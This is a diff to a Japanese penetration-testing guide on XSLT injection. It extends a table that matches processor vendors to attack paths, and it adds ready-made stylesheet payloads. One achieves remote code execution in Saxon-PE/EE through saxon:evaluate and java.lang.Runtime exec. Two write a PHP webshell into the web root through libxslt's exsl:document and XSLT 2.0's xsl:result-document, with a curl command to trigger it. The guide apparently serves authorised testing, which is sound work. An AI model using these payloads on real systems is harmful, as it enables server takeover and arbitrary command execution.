@@ -65,8 +65,10 @@
 
 | 出力値 | 意味 | 次にやること |
 |--------|------|------------|
-| `Vendor URL: http://xmlsoft.org/XSLT/` | libxslt（C）。PHP連携の場合もある | ② → ④ → ③ の順で試す（③の `document()` はlibxsltでほぼブロックされるため最後） |
-| `Vendor: SAXON` またはバージョン番号（HE/PE/EE付き）| Saxon（Java）。バージョン番号でCVEを確認 | searchsploit / NVD でバージョン+CVEを確認。③ `document()` / `unparsed-text()` を試す |
+| `Vendor URL: http://xmlsoft.org/XSLT/` | libxslt（C）。PHP連携の場合もある | ② → ④ → ⑦ → ③ の順で試す（⑦の `exsl:document` はビルド依存・EXSLT 有効ビルドで任意ファイル書込が刺さる。③ の `document()` はlibxsltでほぼブロックされるため最後） |
+| `Vendor: SAXON` + edition が `Saxon-PE` / `Saxon-EE` | Saxon（Java）有償版。Java 拡張関数が有効 | ⑥ `saxon:evaluate` + `java.lang.Runtime` 経由 RCE が射程 |
+| `Vendor: SAXON` + edition が `Saxon-HE` | Saxon（Java）無償版。Java 拡張関数なし | ③ `document()` / `unparsed-text()` でファイル読み・SSRF。RCE は版数 CVE に依存 |
+| `Vendor: SAXON` のみ（edition 不明） | Saxon の古いバージョン | searchsploit / NVD でバージョン+CVEを確認。③ → ⑥ → ⑦ の順に試す |
 | `Vendor: Apache Software Foundation` | Xalan（Java） | ⑤ Java拡張要素（`rt:exec`）を試す |
 | `Vendor: Microsoft` | .NET XslCompiledTransform | `msxsl:script` 拡張（C#コード埋め込み）を試す |
 | `Version: 1.0` | XSLT 1.0 のみ対応 | `unparsed-text()` 等の XSLT 2.0 機能は使えない |
@@ -178,6 +180,57 @@ RCEを狙う場合は、`file_get_contents` の行を `system` / `passthru` に�
   </xsl:template>
 </xsl:stylesheet>
 ```
+
+**⑥ Saxon-PE / Saxon-EE の Java extension functions による RCE**
+
+Saxon-HE（無償版）には Java 拡張関数は無いが、**Saxon-PE / Saxon-EE では Java の `java.lang.*` を XSLT から呼び出せる** (`saxon:evaluate` / `saxon:expression` / インライン Java 拡張) ため RCE 経路になる。`system-property('xsl:vendor')` のフィンガープリント時に Saxon の edition（HE / PE / EE）を判別する手がかりはバージョン文字列の末尾。
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="2.0"
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:saxon="http://saxon.sf.net/"
+                xmlns:Runtime="java:java.lang.Runtime">
+  <xsl:template match="/">
+    <!-- saxon:evaluate で動的に XPath / XQuery 式を評価 → 拡張関数経由でコマンド実行 -->
+    <xsl:value-of select="saxon:evaluate('Runtime:exec(Runtime:getRuntime(), &quot;id&quot;)')"/>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+エラーで `Cannot find a 1-argument function named saxon:evaluate` が出る場合は Saxon-HE（拡張関数なし）の可能性。Saxon-PE / EE の場合のみ刺さる。`system-property('xsl:product-name')` で `Saxon-EE` / `Saxon-PE` の文字列が見えるかを最初に確認。
+
+**⑦ libxslt の `exsl:document` / `xsl:result-document` による任意ファイル書込**
+
+EXSLT（`http://exslt.org/common`）拡張がビルドに含まれている古い libxslt（CVE-2012-2436 等）では、`exsl:document` で任意パスにファイルを書き出せる。XSLT 2.0 系（Saxon）では `xsl:result-document` が同等の機能を持つ。書込先に Web ルートを指定すれば webshell 設置が可能。
+
+```xml
+<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+                xmlns:exsl="http://exslt.org/common"
+                extension-element-prefixes="exsl">
+  <xsl:template match="/">
+    <!-- libxslt + EXSLT 有効ビルド: 任意パスに任意内容のファイルを書込 -->
+    <exsl:document href="/var/www/html/shell.php" method="text">
+      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
+    </exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+```xml
+<!-- XSLT 2.0 (Saxon) 版: xsl:result-document -->
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:result-document href="file:///var/www/html/shell.php" method="text">
+      <xsl:text>&lt;?php system($_GET['c']); ?&gt;</xsl:text>
+    </xsl:result-document>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+書込が成立したら `curl http://[TARGET]/shell.php?c=id` で確認。**任意ファイル書込は不可逆操作**なので、書込先・ファイル名は kedalab テスト識別子 (`kedalab-[CASE_ID]_shell.php` 等) を含めて原状回復で grep 削除しやすくする。
 
 ### 刺さらなかったとき
 
